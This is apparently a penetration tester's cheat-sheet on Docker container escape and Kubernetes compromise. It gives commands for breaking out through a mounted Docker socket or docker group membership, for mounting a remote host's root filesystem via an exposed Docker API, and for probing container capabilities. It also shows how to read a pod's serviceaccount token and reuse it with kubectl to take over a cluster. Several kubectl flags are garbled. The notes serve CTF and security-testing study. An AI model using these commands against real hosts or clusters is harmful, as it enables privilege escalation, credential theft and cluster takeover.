# Docker

## Are we in a container?
.dockerenv # file in /

cat /proc/self/cgroup

## Login with access token
docker login -e <email> -u oauth2accesstoken -p "<access token>" https://gcr.io
docker pull gcr.io/bsides-ctf-2017/zumbo

## Breakout
try to install the Docker client inside the container (Docker socket needs to be mounted inside!)
then you can talk to the Docker daemon on the host vm and inspect all other containers with root privileges

If the docker jail user is also in the docker group just do:
docker run -v /:/tmp -i -t bash bash

## List docker images remotely
docker --host tcp://192.168.1.101 images
docker --host tcp://192.168.1.101 ps

## create a new docker for wordpress, but then chroot the root-filesystem to /pwn folder
docker --host tcp://192.168.1.101 run -v /:/pwn -i -t wordpress /bin/bash

## contained.af - more Docker Breakouts
Do you have access to CAP_NET_RAW?
- CAP_NET_RAW allows you to use RAW and PACKET sockets and bind to any address for transparent proxying.
ping 1.1.1.1
wget eff.org
man capabilities

Is the socket syscall blocked?
- The socket syscall socket() creates an endpoint for communication and returns a file descriptor that refers to that endpoint.
nc -lvup 12345
nc -lvp 12345

Is the nanosleep syscall blocked?
- The nanosleep syscall suspends the execution of the calling thread until either at least the time specified in *req has elapsed, or the delivery of a signal that triggers the invocation of a handler in the calling thread or that terminates the process.
sleep 10

Is the container running with an apparmor profile?
- AppArmor is a Linux security module that allows for setting permissions and auditing processes.
cat /proc/self/attr/current

Do you have access to CAP_SYS_ADMIN?
- CAP_SYS_ADMIN syscall allows you to do all kinds of things. Override resource limits! Call perf_event_open! See the capabilities man page for the full list
Hint: Can you create a swap and mount it? Try it! No
Not quite... Try mounting a tmpfs with mount.
mount


Do you have access to CAP_SYS_TIME?
- CAP_SYS_TIME is the capability that allows a user to set the system clock or real-time (hardware) clock
Hint: How can you alter system date? (date --help) No
date -s '00:00:01'
man capabilities

Do you have access to CAP_SYSLOG?
- CAP_SYSLOG is the capability that allows a user to execute syslog privileged operations
Hint: What's a syslog capability? No
dmesg -c
man capabilities

Do you have access to CAP_SYS_MODULE?
- CAP_SYS_MODULE is the capability that allows a user to load and unload kernel modules
Hint: What kernel modules are loaded? How can you remove one? No
rmmod veth
man capabilities

## Breakout through Mounting
it is possible to mount volumes that contain files with capability bits set into containers

## list all capabilities
capsh --print
pscap
captest
filecap -a 2>&1 | grep -v "Unable to get capabilities"

## Referenc
./docker-containers-paper.pdf
https://www.nccgroup.trust/globalassets/our-research/us/whitepapers/2016/april/ncc_group_understanding_hardening_linux_containers-1-1.pdf

## Running Docker Bench for Security
https://github.com/docker/docker-bench-security

## Docker CVEs
docker version
? < 0.11.1 --> Shocker Breakout PoC

## Kubernetes makes cluster compromise trivial as it will use the serviceaccount token without additional prompting
cat /var/run/secrets/kubernetes.io/serviceaccount
kubectl exec a_pod - cat /flag .
Details: https://gist.github.com/tmc/8cd2364f7b6702ac6318c64a3d17e32d
kubectl config set-cluster pwned --erver=https://${public_ip} -insecure-skip-tls-verify
kubectl config set-credentials pwn -token=${serviceacount_token}
kubectl config set-context pwned --luster=pwned --ser=pwn
kubectl config use-context pwned


tags: docker breakout escape
